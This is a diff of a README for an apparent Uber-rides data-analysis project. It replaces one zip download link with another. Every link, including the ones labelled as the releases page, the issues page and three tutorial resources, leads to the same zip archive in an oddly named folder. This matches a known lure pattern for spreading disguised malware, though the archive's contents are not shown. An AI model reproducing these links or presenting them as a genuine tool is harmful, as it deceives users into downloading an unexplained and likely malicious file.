@@ -1,6 +1,6 @@
 # 🚀 uber-drives-data-analysis - Transform Raw Data into Actionable Insights
 
-[![Download Now](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip)
+[![Download Now](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip)
 
 ## 📖 Description
 
@@ -28,7 +28,7 @@ To start using this application, follow these simple steps to download and run i
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: You can find the application and download it by visiting this link: [Download Page](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip).
+1. **Visit the Releases Page**: You can find the application and download it by visiting this link: [Download Page](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip).
 
 2. **Choose the Latest Release**: Look for the most recent version. This version includes all the latest updates and features.
 
@@ -61,7 +61,7 @@ To start using this application, follow these simple steps to download and run i
 
 ## 🌐 Help & Support
 
-If you encounter any problems, please check the [Issues Page](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip). You can find solutions to common problems or report new issues if needed.
+If you encounter any problems, please check the [Issues Page](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip). You can find solutions to common problems or report new issues if needed.
 
 ## 🚀 Contributing
 
@@ -73,10 +73,10 @@ This project is licensed under the MIT License. You can find more details in the
 
 ## 🔗 Additional Resources
 
-- [Introduction to Data Analysis](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip)
-- [Getting Started with Python for Data Work](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip)
-- [Data Visualization Techniques](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip)
+- [Introduction to Data Analysis](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip)
+- [Getting Started with Python for Data Work](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip)
+- [Data Visualization Techniques](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip)
 
 Feel free to explore these resources for a deeper understanding of the methods and tools used in this application. 
 
-[Download Page](https://raw.githubusercontent.com/wong-lanang/uber-drives-data-analysis/main/aflagellar/uber-drives-analysis-data-v1.7.zip)
+[Download Page](https://github.com/wong-lanang/uber-drives-data-analysis/raw/refs/heads/main/aflagellar/analysis_drives_data_uber_3.4.zip)
